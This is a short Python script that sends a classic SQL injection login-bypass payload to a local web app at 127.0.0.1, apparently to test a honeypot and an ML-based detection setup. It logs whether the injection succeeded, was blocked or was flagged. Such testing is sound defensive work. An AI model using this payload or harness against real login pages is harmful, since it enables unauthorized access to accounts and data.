import requests
import os
import logging

# Log directory setup
log_dir = os.path.join(os.getcwd(), "logs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Configure attack logging
logging.basicConfig(
    filename=os.path.join(log_dir, "attack_logs.log"),
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# URLs
login_url = 'http://127.0.0.1:5000/'
honeypot_url = 'http://127.0.0.1:5000/fake-login'

# SQL Injection payload
login_payload = {
    'username': "admin' OR '1'='1",
    'password': ''
}

# Honeypot payload
honeypot_payload = {
    'username': "honeypot_user",
    'password': "test123"
}

# Perform SQL Injection
# Perform SQL Injection
logging.info("Starting SQL Injection attack...")
try:
    response = requests.post(login_url, data=login_payload)

    # Check for responses
    if "Login Successful!" in response.text:
        logging.info("SQL Injection attack successful!")
        print("SQL Injection Successful!")
    elif "SQL Injection Successful!" in response.text:
        logging.warning("SQL Injection detected by vulnerable system!")
        print("SQL Injection Detected!")
    elif "SQL Injection Failed!" in response.text:
        logging.info("SQL Injection attempt blocked.")
        print("SQL Injection Failed!")
    elif "Suspicious activity detected!" in response.text:
        logging.warning("Suspicious activity flagged by ML.")
        print("Suspicious activity detected!")
    else:
        logging.warning("SQL Injection attempt failed without detection.")
        print("SQL Injection Failed!")


except requests.exceptions.RequestException as e:
    logging.error(f"Attack failed: {e}")
    print(f"Attack failed: {e}")

